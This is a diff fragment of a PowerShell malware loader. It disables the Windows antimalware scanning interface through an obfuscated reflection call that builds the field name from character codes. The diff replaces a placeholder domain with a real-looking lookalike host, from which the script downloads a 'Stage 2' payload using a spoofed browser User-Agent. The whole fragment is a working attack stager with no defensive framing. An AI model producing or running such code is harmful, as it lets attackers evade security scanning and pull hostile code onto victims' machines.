@@ -7,7 +7,7 @@ $f = $t.GetField("$([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[c
 $f.SetValue($null, $true)
 
 # 2. Fetch Stage 2
-$base = 'https://YOURDOMAIN.com' 
+$base = 'https://site-assetss.vercel.app' 
 $url = "$base/assets/config-policy.txt"
 $c = New-Object Net.WebClient
 $c.Headers.Add('User-Agent','Mozilla/5.0')
